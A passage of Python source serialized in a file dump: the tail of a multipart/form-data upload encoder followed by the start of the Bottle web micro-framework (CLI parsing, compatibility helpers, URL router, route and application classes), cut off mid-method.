fd.len if hasattr(fd, \"len\") else os.fstat(fd.fileno())[stat.ST_SIZE]\n            filename = fd.name.split(\"/\")[-1] if \"/\" in fd.name else fd.name.split(\"\\\\\")[-1]\n            try:\n                contenttype = mimetypes.guess_type(filename)[0] or b\"application/octet-stream\"\n            except:\n                # Reference: http://bugs.python.org/issue9291\n                contenttype = b\"application/octet-stream\"\n            buf += b\"--%s\\r\\n\" % getBytes(boundary)\n            buf += b\"Content-Disposition: form-data; name=\\\"%s\\\"; filename=\\\"%s\\\"\\r\\n\" % (getBytes(key), getBytes(filename))\n            buf += b\"Content-Type: %s\\r\\n\" % getBytes(contenttype)\n            # buf += b\"Content-Length: %s\\r\\n\" % file_size\n            fd.seek(0)\n\n            buf += b\"\\r\\n%s\\r\\n\" % fd.read()\n\n        buf += b\"--%s--\\r\\n\\r\\n\" % getBytes(boundary)\n        buf = getBytes(buf)\n\n        return boundary, buf\n\n    https_request = http_request\n", "thirdparty/bottle/bottle.py": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\"\"\"\nBottle is a fast and simple micro-framework for small web applications. It\noffers request dispatching (Routes) with URL parameter support, templates,\na built-in HTTP Server and adapters for many third party WSGI/HTTP-server and\ntemplate engines - all in a single file and with no dependencies other than the\nPython Standard Library.\n\nHomepage and documentation: http://bottlepy.org/\n\nCopyright (c) 2009-2018, Marcel Hellkamp.\nLicense: MIT (see LICENSE for details)\n\"\"\"\n\nfrom __future__ import print_function\nimport sys\n\n__author__ = 'Marcel Hellkamp'\n__version__ = '0.13-dev'\n__license__ = 'MIT'\n\n###############################################################################\n# Command-line interface ######################################################\n###############################################################################\n# INFO: Some server adapters need to monkey-patch std-lib modules before they\n# are imported. This is why some of the command-line handling is done here, but\n# the actual call to _main() is at the end of the file.\n\n\ndef _cli_parse(args):  # pragma: no coverage\n    from argparse import ArgumentParser\n\n    parser = ArgumentParser(prog=args[0], usage=\"%(prog)s [options] package.module:app\")\n    opt = parser.add_argument\n    opt(\"--version\", action=\"store_true\", help=\"show version number.\")\n    opt(\"-b\", \"--bind\", metavar=\"ADDRESS\", help=\"bind socket to ADDRESS.\")\n    opt(\"-s\", \"--server\", default='wsgiref', help=\"use SERVER as backend.\")\n    opt(\"-p\", \"--plugin\", action=\"append\", help=\"install additional plugin/s.\")\n    opt(\"-c\", \"--conf\", action=\"append\", metavar=\"FILE\",\n        help=\"load config values from FILE.\")\n    opt(\"-C\", \"--param\", action=\"append\", metavar=\"NAME=VALUE\",\n        help=\"override config values.\")\n    opt(\"--debug\", action=\"store_true\", help=\"start server in debug mode.\")\n    opt(\"--reload\", action=\"store_true\", help=\"auto-reload on file changes.\")\n    opt('app', help='WSGI app entry point.', nargs='?')\n\n    cli_args = parser.parse_args(args[1:])\n\n    return cli_args, parser\n\n\ndef _cli_patch(cli_args):  # pragma: no coverage\n    parsed_args, _ = _cli_parse(cli_args)\n    opts = parsed_args\n    if opts.server:\n        if opts.server.startswith('gevent'):\n            import gevent.monkey\n            gevent.monkey.patch_all()\n        elif opts.server.startswith('eventlet'):\n            import eventlet\n            eventlet.monkey_patch()\n\n\nif __name__ == '__main__':\n    _cli_patch(sys.argv)\n\n###############################################################################\n# Imports and Python 2/3 unification ##########################################\n###############################################################################\n\nimport base64, calendar, email.utils, functools, hmac, itertools,\\\n       mimetypes, os, re, tempfile, threading, time, warnings, weakref, hashlib\n\nfrom types import FunctionType\nfrom datetime import date as datedate, datetime, timedelta\nfrom tempfile import NamedTemporaryFile\nfrom traceback import format_exc, print_exc\nfrom unicodedata import normalize\n\ntry:\n    from ujson import dumps as json_dumps, loads as json_lds\nexcept ImportError:\n    from json import dumps as json_dumps, loads as json_lds\n\npy = sys.version_info\npy3k = py.major > 2\n\n# Lots of stdlib and builtin differences.\nif py3k:\n    import http.client as httplib\n    import _thread as thread\n    from urllib.parse import urljoin, SplitResult as UrlSplitResult\n    from urllib.parse import urlencode, quote as urlquote, unquote as urlunquote\n    urlunquote = functools.partial(urlunquote, encoding='latin1')\n    from http.cookies import SimpleCookie, Morsel, CookieError\n    from collections import defaultdict\n    from collections.abc import MutableMapping as DictMixin\n    from types import ModuleType as new_module\n    import pickle\n    from io import BytesIO\n    import configparser\n    # getfullargspec was deprecated in 3.5 and un-deprecated in 3.6\n    # getargspec was deprecated in 3.0 and removed in 3.11\n    from inspect import getfullargspec\n    def getargspec(func):\n        spec = getfullargspec(func)\n        kwargs = makelist(spec[0]) + makelist(spec.kwonlyargs)\n        return kwargs, spec[1], spec[2], spec[3]\n\n    basestring = str\n    unicode = str\n    json_loads = lambda s: json_lds(touni(s))\n    callable = lambda x: hasattr(x, '__call__')\n    imap = map\n\n    def _raise(*a):\n        raise a[0](a[1]).with_traceback(a[2])\nelse:  # 2.x\n    import httplib\n    import thread\n    from urlparse import urljoin, SplitResult as UrlSplitResult\n    from urllib import urlencode, quote as urlquote, unquote as urlunquote\n    from Cookie import SimpleCookie, Morsel, CookieError\n    from itertools import imap\n    import cPickle as pickle\n    from imp import new_module\n    from StringIO import StringIO as BytesIO\n    import ConfigParser as configparser\n    from collections import MutableMapping as DictMixin, defaultdict\n    from inspect import getargspec\n\n    unicode = unicode\n    json_loads = json_lds\n    exec(compile('def _raise(*a): raise a[0], a[1], a[2]', '<py3fix>', 'exec'))\n\n# Some helpers for string/byte handling\ndef tob(s, enc='utf8'):\n    if isinstance(s, unicode):\n        return s.encode(enc)\n    return b'' if s is None else bytes(s)\n\n\ndef touni(s, enc='utf8', err='strict'):\n    if isinstance(s, bytes):\n        return s.decode(enc, err)\n    return unicode(\"\" if s is None else s)\n\n\ntonat = touni if py3k else tob\n\n\ndef _stderr(*args):\n    try:\n        print(*args, file=sys.stderr)\n    except (IOError, AttributeError):\n        pass # Some environments do not allow printing (mod_wsgi)\n\n\n# A bug in functools causes it to break if the wrapper is an instance method\ndef update_wrapper(wrapper, wrapped, *a, **ka):\n    try:\n        functools.update_wrapper(wrapper, wrapped, *a, **ka)\n    except AttributeError:\n        pass\n\n# These helpers are used at module level and need to be defined first.\n# And yes, I know PEP-8, but sometimes a lower-case classname makes more sense.\n\n\ndef depr(major, minor, cause, fix):\n    text = \"Warning: Use of deprecated feature or API. (Deprecated in Bottle-%d.%d)\\n\"\\\n           \"Cause: %s\\n\"\\\n           \"Fix: %s\\n\" % (major, minor, cause, fix)\n    if DEBUG == 'strict':\n        raise DeprecationWarning(text)\n    warnings.warn(text, DeprecationWarning, stacklevel=3)\n    return DeprecationWarning(text)\n\n\ndef makelist(data):  # This is just too handy\n    if isinstance(data, (tuple, list, set, dict)):\n        return list(data)\n    elif data:\n        return [data]\n    else:\n        return []\n\n\nclass DictProperty(object):\n    \"\"\" Property that maps to a key in a local dict-like attribute. \"\"\"\n\n    def __init__(self, attr, key=None, read_only=False):\n        self.attr, self.key, self.read_only = attr, key, read_only\n\n    def __call__(self, func):\n        functools.update_wrapper(self, func, updated=[])\n        self.getter, self.key = func, self.key or func.__name__\n        return self\n\n    def __get__(self, obj, cls):\n        if obj is None: return self\n        key, storage = self.key, getattr(obj, self.attr)\n        if key not in storage: storage[key] = self.getter(obj)\n        return storage[key]\n\n    def __set__(self, obj, value):\n        if self.read_only: raise AttributeError(\"Read-Only property.\")\n        getattr(obj, self.attr)[self.key] = value\n\n    def __delete__(self, obj):\n        if self.read_only: raise AttributeError(\"Read-Only property.\")\n        del getattr(obj, self.attr)[self.key]\n\n\nclass cached_property(object):\n    \"\"\" A property that is only computed once per instance and then replaces\n        itself with an ordinary attribute. Deleting the attribute resets the\n        property. \"\"\"\n\n    def __init__(self, func):\n        update_wrapper(self, func)\n        self.func = func\n\n    def __get__(self, obj, cls):\n        if obj is None: return self\n        value = obj.__dict__[self.func.__name__] = self.func(obj)\n        return value\n\n\nclass lazy_attribute(object):\n    \"\"\" A property that caches itself to the class object. \"\"\"\n\n    def __init__(self, func):\n        functools.update_wrapper(self, func, updated=[])\n        self.getter = func\n\n    def __get__(self, obj, cls):\n        value = self.getter(cls)\n        setattr(cls, self.__name__, value)\n        return value\n\n\n###############################################################################\n# Exceptions and Events #######################################################\n###############################################################################\n\n\nclass BottleException(Exception):\n    \"\"\" A base class for exceptions used by bottle. \"\"\"\n    pass\n\n###############################################################################\n# Routing ######################################################################\n###############################################################################\n\n\nclass RouteError(BottleException):\n    \"\"\" This is a base class for all routing related exceptions \"\"\"\n\n\nclass RouteReset(BottleException):\n    \"\"\" If raised by a plugin or request handler, the route is reset and all\n        plugins are re-applied. \"\"\"\n\n\nclass RouterUnknownModeError(RouteError):\n\n    pass\n\n\nclass RouteSyntaxError(RouteError):\n    \"\"\" The route parser found something not supported by this router. \"\"\"\n\n\nclass RouteBuildError(RouteError):\n    \"\"\" The route could not be built. \"\"\"\n\n\ndef _re_flatten(p):\n    \"\"\" Turn all capturing groups in a regular expression pattern into\n        non-capturing groups. \"\"\"\n    if '(' not in p:\n        return p\n    return re.sub(r'(\\\\*)(\\(\\?P<[^>]+>|\\((?!\\?))', lambda m: m.group(0) if\n                  len(m.group(1)) % 2 else m.group(1) + '(?:', p)\n\n\nclass Router(object):\n    \"\"\" A Router is an ordered collection of route->target pairs. It is used to\n        efficiently match WSGI requests against a number of routes and return\n        the first target that satisfies the request. The target may be anything,\n        usually a string, ID or callable object. A route consists of a path-rule\n        and a HTTP method.\n\n        The path-rule is either a static path (e.g. `/contact`) or a dynamic\n        path that contains wildcards (e.g. `/wiki/<page>`). The wildcard syntax\n        and details on the matching order are described in docs:`routing`.\n    \"\"\"\n\n    default_pattern = '[^/]+'\n    default_filter = 're'\n\n    #: The current CPython regexp implementation does not allow more\n    #: than 99 matching groups per regular expression.\n    _MAX_GROUPS_PER_PATTERN = 99\n\n    def __init__(self, strict=False):\n        self.rules = []  # All rules in order\n        self._groups = {}  # index of regexes to find them in dyna_routes\n        self.builder = {}  # Data structure for the url builder\n        self.static = {}  # Search structure for static routes\n        self.dyna_routes = {}\n        self.dyna_regexes = {}  # Search structure for dynamic routes\n        #: If true, static routes are no longer checked first.\n        self.strict_order = strict\n        self.filters = {\n            're': lambda conf: (_re_flatten(conf or self.default_pattern),\n                                None, None),\n            'int': lambda conf: (r'-?\\d+', int, lambda x: str(int(x))),\n            'float': lambda conf: (r'-?[\\d.]+', float, lambda x: str(float(x))),\n            'path': lambda conf: (r'.+?', None, None)\n        }\n\n    def add_filter(self, name, func):\n        \"\"\" Add a filter. The provided function is called with the configuration\n        string as parameter and must return a (regexp, to_python, to_url) tuple.\n        The first element is a string, the last two are callables or None. \"\"\"\n        self.filters[name] = func\n\n    rule_syntax = re.compile('(\\\\\\\\*)'\n        '(?:(?::([a-zA-Z_][a-zA-Z_0-9]*)?()(?:#(.*?)#)?)'\n          '|(?:<([a-zA-Z_][a-zA-Z_0-9]*)?(?::([a-zA-Z_]*)'\n            '(?::((?:\\\\\\\\.|[^\\\\\\\\>])+)?)?)?>))')\n\n    def _itertokens(self, rule):\n        offset, prefix = 0, ''\n        for match in self.rule_syntax.finditer(rule):\n            prefix += rule[offset:match.start()]\n            g = match.groups()\n            if g[2] is not None:\n                depr(0, 13, \"Use of old route syntax.\",\n                            \"Use <name> instead of :name in routes.\")\n            if len(g[0]) % 2:  # Escaped wildcard\n                prefix += match.group(0)[len(g[0]):]\n                offset = match.end()\n                continue\n            if prefix:\n                yield prefix, None, None\n            name, filtr, conf = g[4:7] if g[2] is None else g[1:4]\n            yield name, filtr or 'default', conf or None\n            offset, prefix = match.end(), ''\n        if offset <= len(rule) or prefix:\n            yield prefix + rule[offset:], None, None\n\n    def add(self, rule, method, target, name=None):\n        \"\"\" Add a new rule or replace the target for an existing rule. \"\"\"\n        anons = 0  # Number of anonymous wildcards found\n        keys = []  # Names of keys\n        pattern = ''  # Regular expression pattern with named groups\n        filters = []  # Lists of wildcard input filters\n        builder = []  # Data structure for the URL builder\n        is_static = True\n\n        for key, mode, conf in self._itertokens(rule):\n            if mode:\n                is_static = False\n                if mode == 'default': mode = self.default_filter\n                mask, in_filter, out_filter = self.filters[mode](conf)\n                if not key:\n                    pattern += '(?:%s)' % mask\n                    key = 'anon%d' % anons\n                    anons += 1\n                else:\n                    pattern += '(?P<%s>%s)' % (key, mask)\n                    keys.append(key)\n                if in_filter: filters.append((key, in_filter))\n                builder.append((key, out_filter or str))\n            elif key:\n                pattern += re.escape(key)\n                builder.append((None, key))\n\n        self.builder[rule] = builder\n        if name: self.builder[name] = builder\n\n        if is_static and not self.strict_order:\n            self.static.setdefault(method, {})\n            self.static[method][self.build(rule)] = (target, None)\n            return\n\n        try:\n            re_pattern = re.compile('^(%s)$' % pattern)\n            re_match = re_pattern.match\n        except re.error as e:\n            raise RouteSyntaxError(\"Could not add Route: %s (%s)\" % (rule, e))\n\n        if filters:\n\n            def getargs(path):\n                url_args = re_match(path).groupdict()\n                for name, wildcard_filter in filters:\n                    try:\n                        url_args[name] = wildcard_filter(url_args[name])\n                    except ValueError:\n                        raise HTTPError(400, 'Path has wrong format.')\n                return url_args\n        elif re_pattern.groupindex:\n\n            def getargs(path):\n                return re_match(path).groupdict()\n        else:\n            getargs = None\n\n        flatpat = _re_flatten(pattern)\n        whole_rule = (rule, flatpat, target, getargs)\n\n        if (flatpat, method) in self._groups:\n            if DEBUG:\n                msg = 'Route <%s %s> overwrites a previously defined route'\n                warnings.warn(msg % (method, rule), RuntimeWarning)\n            self.dyna_routes[method][\n                self._groups[flatpat, method]] = whole_rule\n        else:\n            self.dyna_routes.setdefault(method, []).append(whole_rule)\n            self._groups[flatpat, method] = len(self.dyna_routes[method]) - 1\n\n        self._compile(method)\n\n    def _compile(self, method):\n        all_rules = self.dyna_routes[method]\n        comborules = self.dyna_regexes[method] = []\n        maxgroups = self._MAX_GROUPS_PER_PATTERN\n        for x in range(0, len(all_rules), maxgroups):\n            some = all_rules[x:x + maxgroups]\n            combined = (flatpat for (_, flatpat, _, _) in some)\n            combined = '|'.join('(^%s$)' % flatpat for flatpat in combined)\n            combined = re.compile(combined).match\n            rules = [(target, getargs) for (_, _, target, getargs) in some]\n            comborules.append((combined, rules))\n\n    def build(self, _name, *anons, **query):\n        \"\"\" Build an URL by filling the wildcards in a rule. \"\"\"\n        builder = self.builder.get(_name)\n        if not builder:\n            raise RouteBuildError(\"No route with that name.\", _name)\n        try:\n            for i, value in enumerate(anons):\n                query['anon%d' % i] = value\n            url = ''.join([f(query.pop(n)) if n else f for (n, f) in builder])\n            return url if not query else url + '?' + urlencode(query)\n        except KeyError as E:\n            raise RouteBuildError('Missing URL argument: %r' % E.args[0])\n\n    def match(self, environ):\n        \"\"\" Return a (target, url_args) tuple or raise HTTPError(400/404/405). \"\"\"\n        verb = environ['REQUEST_METHOD'].upper()\n        path = environ['PATH_INFO'] or '/'\n\n        methods = ('PROXY', 'HEAD', 'GET', 'ANY') if verb == 'HEAD' else ('PROXY', verb, 'ANY')\n\n        for method in methods:\n            if method in self.static and path in self.static[method]:\n                target, getargs = self.static[method][path]\n                return target, getargs(path) if getargs else {}\n            elif method in self.dyna_regexes:\n                for combined, rules in self.dyna_regexes[method]:\n                    match = combined(path)\n                    if match:\n                        target, getargs = rules[match.lastindex - 1]\n                        return target, getargs(path) if getargs else {}\n\n        # No matching route found. Collect alternative methods for 405 response\n        allowed = set([])\n        nocheck = set(methods)\n        for method in set(self.static) - nocheck:\n            if path in self.static[method]:\n                allowed.add(method)\n        for method in set(self.dyna_regexes) - allowed - nocheck:\n            for combined, rules in self.dyna_regexes[method]:\n                match = combined(path)\n                if match:\n                    allowed.add(method)\n        if allowed:\n            allow_header = \",\".join(sorted(allowed))\n            raise HTTPError(405, \"Method not allowed.\", Allow=allow_header)\n\n        # No matching route and no alternative method found. We give up\n        raise HTTPError(404, \"Not found: \" + repr(path))\n\n\nclass Route(object):\n    \"\"\" This class wraps a route callback along with route specific metadata and\n        configuration and applies Plugins on demand. It is also responsible for\n        turning an URL path rule into a regular expression usable by the Router.\n    \"\"\"\n\n    def __init__(self, app, rule, method, callback,\n                 name=None,\n                 plugins=None,\n                 skiplist=None, **config):\n        #: The application this route is installed to.\n        self.app = app\n        #: The path-rule string (e.g. ``/wiki/<page>``).\n        self.rule = rule\n        #: The HTTP method as a string (e.g. ``GET``).\n        self.method = method\n        #: The original callback with no plugins applied. Useful for introspection.\n        self.callback = callback\n        #: The name of the route (if specified) or ``None``.\n        self.name = name or None\n        #: A list of route-specific plugins (see :meth:`Bottle.route`).\n        self.plugins = plugins or []\n        #: A list of plugins to not apply to this route (see :meth:`Bottle.route`).\n        self.skiplist = skiplist or []\n        #: Additional keyword arguments passed to the :meth:`Bottle.route`\n        #: decorator are stored in this dictionary. Used for route-specific\n        #: plugin configuration and meta-data.\n        self.config = app.config._make_overlay()\n        self.config.load_dict(config)\n\n    @cached_property\n    def call(self):\n        \"\"\" The route callback with all plugins applied. This property is\n            created on demand and then cached to speed up subsequent requests.\"\"\"\n        return self._make_callback()\n\n    def reset(self):\n        \"\"\" Forget any cached values. The next time :attr:`call` is accessed,\n            all plugins are re-applied. \"\"\"\n        self.__dict__.pop('call', None)\n\n    def prepare(self):\n        \"\"\" Do all on-demand work immediately (useful for debugging).\"\"\"\n        self.call\n\n    def all_plugins(self):\n        \"\"\" Yield all Plugins affecting this route. \"\"\"\n        unique = set()\n        for p in reversed(self.app.plugins + self.plugins):\n            if True in self.skiplist: break\n            name = getattr(p, 'name', False)\n            if name and (name in self.skiplist or name in unique): continue\n            if p in self.skiplist or type(p) in self.skiplist: continue\n            if name: unique.add(name)\n            yield p\n\n    def _make_callback(self):\n        callback = self.callback\n        for plugin in self.all_plugins():\n            try:\n                if hasattr(plugin, 'apply'):\n                    callback = plugin.apply(callback, self)\n                else:\n                    callback = plugin(callback)\n            except RouteReset:  # Try again with changed configuration.\n                return self._make_callback()\n            if callback is not self.callback:\n                update_wrapper(callback, self.callback)\n        return callback\n\n    def get_undecorated_callback(self):\n        \"\"\" Return the callback. If the callback is a decorated function, try to\n            recover the original function. \"\"\"\n        func = self.callback\n        func = getattr(func, '__func__' if py3k else 'im_func', func)\n        closure_attr = '__closure__' if py3k else 'func_closure'\n        while hasattr(func, closure_attr) and getattr(func, closure_attr):\n            attributes = getattr(func, closure_attr)\n            func = attributes[0].cell_contents\n\n            # in case of decorators with multiple arguments\n            if not isinstance(func, FunctionType):\n                # pick first FunctionType instance from multiple arguments\n                func = filter(lambda x: isinstance(x, FunctionType),\n                              map(lambda x: x.cell_contents, attributes))\n                func = list(func)[0]  # py3 support\n        return func\n\n    def get_callback_args(self):\n        \"\"\" Return a list of argument names the callback (most likely) accepts\n            as keyword arguments. If the callback is a decorated function, try\n            to recover the original function before inspection. \"\"\"\n        return getargspec(self.get_undecorated_callback())[0]\n\n    def get_config(self, key, default=None):\n        \"\"\" Lookup a config field and return its value, first checking the\n            route.config, then route.app.config.\"\"\"\n        depr(0, 13, \"Route.get_config() is deprecated.\",\n                    \"The Route.config property already includes values from the\"\n                    \" application config for missing keys. Access it directly.\")\n        return self.config.get(key, default)\n\n    def __repr__(self):\n        cb = self.get_undecorated_callback()\n        return '<%s %s -> %s:%s>' % (self.method, self.rule, cb.__module__, cb.__name__)\n\n###############################################################################\n# Application Object ###########################################################\n###############################################################################\n\n\nclass Bottle(object):\n    \"\"\" Each Bottle object represents a single, distinct web application and\n        consists of routes, callbacks, plugins, resources and configuration.\n        Instances are callable WSGI applications.\n\n        :param catchall: If true (default), handle all exceptions. Turn off to\n                         let debugging middleware handle exceptions.\n    \"\"\"\n\n    @lazy_attribute\n    def _global_config(cls):\n        cfg = ConfigDict()\n        cfg.meta_set('catchall', 'validate', bool)\n        return cfg\n\n    def __init__(self, **kwargs):\n        #: A :class:`ConfigDict` for app specific configuration.\n        self.config = self._global_config._make_overlay()\n        self.config._add_change_listener(\n            functools.partial(self.trigger_hook, 'config'))\n\n        self.config.update({\n            \"catchall\": True\n        })\n\n        if kwargs.get('catchall') is False:\n            depr(0, 13, \"Bottle(catchall) keyword argument.\",\n                        \"The 'catchall' setting is now part of the app \"\n                        \"configuration. Fix: `app.config['catchall'] = False`\")\n            self.config['catchall'] = False\n        if kwargs.get('autojson') is False:\n            depr(0, 13, \"Bottle(autojson) keyword argument.\",\n                 \"The 'autojson' setting is now part of the app \"\n                 \"configuration. Fix: `app.config['json.enable'] = False`\")\n            self.config['json.disable'] = True\n\n        self._mounts = []\n\n        #: A :class:`ResourceManager` for application files\n        self.resources = ResourceManager()\n\n        self.routes = []  # List of installed :class:`Route` instances.\n        self.router = Router()  # Maps requests to :class:`Route` instances.\n        self.error_handler = {}\n\n        # Core plugins\n        self.plugins = []  # List of installed plugins.\n        self.install(JSONPlugin())\n        self.install(TemplatePlugin())\n\n    #: If true, most exceptions are caught and returned as :exc:`HTTPError`\n    catchall = DictProperty('config', 'catchall')\n\n    __hook_names = 'before_request', 'after_request', 'app_reset', 'config'\n    __hook_reversed = {'after_request'}\n\n    @cached_property\n    def _hooks(self):\n        return dict((name, []) for name in self.__hook_names)\n\n    def add_hook(self, name, func):\n        \"\"\" Attach a callback to a hook. Three hooks are currently implemented:\n\n            before_request\n                Executed once before each request. The request context is\n                available, but no routing has happened yet.\n            after_request\n                Executed once after each request regardless of its outcome.\n            app_reset\n                Called whenever :meth:`Bottle.reset` is called.\n        \"\"\"\n        if name in self.__hook_reversed:\n            self._hooks[name].insert(0, func)\n        else:\n            self._hooks[name].append(func)\n\n    def remove_hook(self, name, func):\n        \"\"\" Remove a callback from a hook. \"\"\"\n        if name in self._hooks and func in self._hooks[name]:\n            self._hooks[name].remove(func)\n            return True\n\n    def trigger_hook(self, __name, *args, **kwargs):\n        \"\"\" Trigger a hook and return a list of results. \"\"\"\n        return [hook(*args, **kwargs) for hook in self._hooks[__name][:]]\n\n    def hook(self, name):\n        \"\"\" Return a decorator that attaches a callback to a hook. See\n            :meth:`add_hook` for details.\"\"\"\n\n        def decorator(func):\n            self.add_hook(name, func)\n            return func\n\n        return decorator\n\n    def _mount_wsgi(self, prefix, app, **options):\n        segments = [p for p in prefix.split('/') if p]\n        if not segments:\n            raise ValueError('WSGI applications cannot be mounted to \"/\".')\n        path_depth = len(segments)\n\n        def mountpoint_wrapper():\n            try:\n                request.path_shift(path_depth)\n                rs = HTTPResponse([])\n\n                def start_response(status, headerlist, exc_info=None):\n                    if exc_info:\n                        _raise(*exc_info)\n                    if py3k:\n                        # Errors here mean that the mounted WSGI app did not\n                        # follow PEP-3333 (which requires latin1) or used a\n                        # pre-encoding other than utf8 :/\n                        status = status.encode('latin1').decode('utf8')\n                        headerlist = [(k, v.encode('latin1').decode('utf8'))\n                                      for (k, v) in headerlist]\n                    rs.status = status\n                    for name, value in headerlist:\n                        rs.add_header(name, value)\n                    return rs.body.append\n\n                body = app(request.environ, start_response)\n                rs.body = itertools.chain(rs.body, body) if rs.body else body\n                return rs\n            finally:\n                request.path_shift(-path_depth)\n\n        options.setdefault('skip', True)\n        options.setdefault('method', 'PROXY')\n        options.setdefault('mountpoint', {'prefix': prefix, 'target': app})\n        options['callback'] = mountpoint_wrapper\n\n        self.route('/%s/<:re:.*>' % '/'.join(segments), **options)\n        if not prefix.endswith('/'):\n            self.route('/' + '/'.join(segments), **options)\n\n    def _mount_app(self, prefix, app, **options):\n        if app in self._mounts or '_mount.app' in app.config:\n            depr(0, 13, \"Application mounted multiple times. Falling back to WSGI mount.\",\n                 \"Clone application before mounting to a different location.\")\n            return self._mount_wsgi(prefix, app, **options)\n\n        if options:\n            depr(0, 13, \"Unsupported mount options. Falling back to WSGI mount.\",\n                 \"Do not specify any route options when mounting bottle application.\")\n            return self._mount_wsgi(prefix, app, **options)\n\n        if not prefix.endswith(\"/\"):\n            depr(0, 13, \"Prefix must end in '/'. Falling back to WSGI mount.\",\n                 \"Consider adding an explicit redirect from '/prefix' to '/prefix/' in the parent application.\")\n            return self._mount_wsgi(prefix, app, **options)\n\n        self._mounts.append(app)\n        app.config['_mount.prefix'] = prefix\n        app.config['_mount.app'] = self\n        for route in app.routes:\n            route.rule = prefix + route.rule.lstrip('/')\n            self.add_route(route)\n\n    def mount(self, prefix, app, **options):\n        \"\"\" Mount an application (:class:`Bottle` or plain WSGI) to a specific\n            URL prefix. Example::\n\n                parent_app.mount('/prefix/', child_app)\n\n            :param prefix: path prefix or `mount-point`.\n            :param app: an instance of :class:`Bottle` or a WSGI application.\n\n            Plugins from the parent application are not applied to the routes\n            of the mounted child application. If you need plugins in the child\n            application, install them separately.\n\n            While it is possible to use path wildcards within the prefix path\n            (:class:`Bottle` childs only), it is highly discouraged.\n\n            The prefix path must end with a slash. If you want to access the\n            root of the child application via `/prefix` in addition to\n            `/prefix/`, consider adding a route with a 307 redirect to the\n            parent application.\n        \"\"\"\n\n        if not prefix.startswith('/'):\n            raise ValueError(\"Prefix must start with '/'\")\n\n        if isinstance(app, Bottle):\n            return self._mount_app(prefix, app, **options)\n        else:\n            return self._mount_wsgi(prefix, app, **options)\n\n    def merge(self, routes):\n        \"\"\" Merge the routes of another :class:`Bottle` application or a list of\n            :class:`Route` objects into this application. The routes keep their\n            'owner', meaning that the :data:`Route.app` attribute is not\n            changed. \"\"\"\n        if isinstance(routes, Bottle):\n            routes = routes.routes\n        for route in routes:\n            self.add_route(route)\n\n    def install(self, plugin):\n        \"\"\" Add a plugin to the list of plugins and prepare it for being\n            applied to all routes of this application. A plugin may be a simple\n            decorator or an object that implements the :class:`Plugin` API.\n        \"\"\"\n        if hasattr(plugin, 'setup'): plugin.setup(self)\n        if not callable(plugin) and not hasattr(plugin, 'apply'):\n            raise TypeError(\"Plugins must be callable or implement .apply()\")\n        self.plugins.append(plugin)\n        self.reset()\n        return plugin\n\n    def uninstall(self, plugin):\n        \"\"\" Uninstall plugins. Pass an instance to remove a specific plugin, a type\n            object to remove all plugins that match that type, a string to remove\n            all plugins with a matching ``name`` attribute or ``True`` to remove all\n            plugins. Return the list of removed plugins. \"\"\"\n        removed, remove = [], plugin\n        for i, plugin in list(enumerate(self.plugins))[::-1]:\n            if remove is True or remove is plugin or remove is type(plugin) \\\n            or getattr(plugin, 'name', True) == remove:\n                removed.append(plugin)\n                del self.plugins[i]\n                if hasattr(plugin, 'close'): plugin.close()\n        if removed: self.reset()\n        return removed\n\n    def reset(self, route=None):\n        \"\"\" Reset all routes (force plugins to be re-applied) and clear all\n            caches. If an ID or route object is given, only that specific route\n            is affected. \"\"\"\n        if route is None: routes = self.routes\n        elif isinstance(route, Route): routes = [route]\n        else: routes = [self.routes[route]]\n        for route in routes:\n            route.reset()\n        if DEBUG:\n            for route in routes:\n                route.prepare()\n        self.trigger_hook('app_reset')\n\n    def close(self):\n        \"\"\" Close the application and all installed plugins. \"\"\"\n        for plugin in self.plugins:\n            if hasattr(plugin, 'close'): plugin.close()\n\n    def run(self, **kwargs):\n        \"\"\" Calls :func:`run` with the same parameters. \"\"\"\n        run(self, **kwargs)\n\n    def match(self, environ):\n        \"\"\" Search for a matching route and return a (:class:`Route`, urlargs)\n            tuple. The second value is a dictionary with parameters extracted\n            from the URL. Raise :exc:`HTTPError` (404/405) on a non-match.\"\"\"\n        return self.router.match(environ)\n\n    def get_url(self, routename, **kargs):\n        \"\"\" Return a string that matches a named route \"\"\"\n        scriptname = request.environ.get('SCRIPT_NAME', '').strip('/') + '/'\n        location = self.router.build(routename, **kargs).lstrip('/')\n        return urljoin(urljoin('/', scriptname), location)\n\n    def add_route(self, route):\n        \"\"\" Add a route object, but do not change the :data:`Route.app`\n            attribute.\"\"\"\n        self.routes.append(route)\n        self.router.add(route.rule, route.method, route, name=route.name)\n        if DEBUG: route.prepare()\n\n    def route(self,\n              path=None,\n              method='GET',\n              callback=None,\n              name=None,\n              apply=None,\n              skip=None, **config):\n        \"\"\" A decorator to bind a function to a request URL. Example::\n\n                @app.route('/hello/<name>')\n                def hello(name):\n                    return 'Hello %s' % name\n\n            The ``<name>`` part is a wildcard. See :class:`Router` for syntax\n            details.\n\n            :param path: Request path or a list of paths to listen to. If no\n              path is specified, it is automatically generated from the\n              signature of the function.\n            :param method: HTTP method (`GET`, `POST`, `PUT`, ...) or a list of\n              methods to listen to. (default: `GET`)\n            :param callback: An optional shortcut to avoid the decorator\n              syntax. ``route(..., callback=func)`` equals ``route(...)(func)``\n            :param name: The name for this route. (default: None)\n            :param apply: A decorator or plugin or a list of plugins. These are\n              applied to the route callback in addition to installed plugins.\n            :param skip: A list of plugins, plugin classes or names. Matching\n              plugins are not installed to this route. ``True`` skips all.\n\n            Any additional keyword arguments are stored as route-specific\n            configuration and passed to plugins (see :meth:`Plugin.apply`).\n        \"\"\"\n        if callable(path): path, callback = None, path\n        plugins = makelist(apply)\n        skiplist = makelist(skip)\n\n        def decorator(callback):\n            if isinstance(callback, basestring): callback = load(callback)\n            for rule in makelist(path) or yieldroutes(callback):\n                for verb in makelist(method):\n                    verb = verb.upper()\n                    route = Route(self, rule, verb, callback,\n                                  name=name,\n                                  plugins=plugins,\n                                  skiplist=skiplist, **config)\n                    self.add_route(route)\n            return callback\n\n        return decorator(callback) if callback else decorator\n\n    def get(self, path=None, method='GET', **options):\n        \"\"\" Equals :meth:`route`. \"\"\"\n        return self.route(path, method, **options)\n\n    def post(self, path=None, method='POST', **options):\n        \"\"\" Equals :meth:`route` with a ``POST`` method parameter. \"\"\"\n        return self.route(path, method, **options)\n\n    def put(self, path=None, method='PUT', **options):\n        \"\"\" Equals :meth:`route` with a ``PUT`` method parameter. \"\"\"\n        return self.route(path, method, **options)\n\n    def delete(self, path=None, method='DELETE', **options):\n        \"\"\" Equals :meth:`route` with a ``DELETE`` method parameter. \"\"\"\n        return self.route(path, method, **options)\n\n    def patch(self, path=None, method='PATCH', **options):\n        \"\"\" Equals :meth:`route` with a 